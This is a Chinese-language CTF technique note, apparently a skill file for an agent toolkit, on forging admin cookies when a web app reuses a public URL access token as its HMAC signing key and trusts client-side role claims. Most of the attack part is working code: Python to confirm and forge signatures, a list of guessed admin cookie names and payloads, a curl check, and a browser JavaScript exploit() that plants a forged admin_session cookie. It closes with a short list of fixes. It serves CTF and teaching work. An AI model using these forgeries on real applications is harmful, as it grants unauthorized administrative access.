# Cookie HMAC 密钥复用 → 后台认证绕过

> 当服务端将 URL 中公开的 access token 同时用作 Cookie 签名密钥，且后台直接信任 Cookie payload 中的声明字段时，可伪造管理员身份。

---

## 适用场景

- 目标为 Web 应用，URL 路径中包含 `access_token` / `token` / `key` 等参数
- 响应头设置了签名 Cookie（如 `student_gate=<payload>.<signature>`）
- 存在多个签名 Cookie（学生端 + 管理端）共用一个密钥的可能
- 后台 Cookie payload 中包含客户端可控的权限声明（如 `{"admin":true}`）

## 关键词

- HMAC key reuse / 签名密钥复用
- Known-key session forgery / 已知密钥会话伪造
- Client-side claims-based auth / 客户端声明式权限
- Cookie signature bypass / Cookie 签名绕过

## 攻击流程

### Step 1：从 URL 提取 access token

入口 URL 中通常可见：

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

提取 token：

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

### Step 2：观察 student_gate Cookie

访问入口，响应头会设置签名 Cookie。格式通常为：

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

解码 payload 确认内容结构。

### Step 3：验证签名算法

用已知的 access token 作为 HMAC key，尝试重现签名：

```python
import hmac, hashlib, base64

access_token = "从URL提取的token"
payload_b64 = "从Cookie提取的payload部分"
expected_sig = "从Cookie提取的签名部分"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("匹配" if computed == expected_sig else "不匹配")
```

如果匹配 → 确认 `access token 就是 HMAC key`。

### Step 4：猜测管理端 Cookie 名称和 payload 结构

常见的管理端 Cookie 名称：

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload 结构试探方向（逐一尝试，直到命中 200）：

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

### Step 5：伪造管理端 Cookie

```python
import hmac, hashlib, json, base64

access_token = "已知的token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

### Step 6：验证后台权限

```bash
curl -k -H "Cookie: <上一步得到的cookie>" https://target/api/admin/me
```

返回 `{"admin":true}` 或 200 + 管理员数据则成功。

## 浏览器复现

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

## 修复方案

1. 使用服务端独立密钥签名 Cookie，不和 URL token 共用
2. 后台权限基于服务端 session，而非客户端 Cookie payload 声明
3. 不同角色使用不同签名密钥
4. Cookie 中加入 `iat` / `exp` / `typ` 等声明并校验
5. 静默处理签名解析异常（失败返回 401，不返回 500）

## 相关案例

- class.pangbaoba.me CTF 靶场后台绕过（student_gate 与 admin_session 共用 access token 作为 HMAC key，`{"admin":true}` 直接获得管理员权限）

## 关联技能

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — Web 运行时分析
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — 类似 token 声明混淆
- `reverse-engineering/languages-platforms.md` — JWT / OAuth 相关
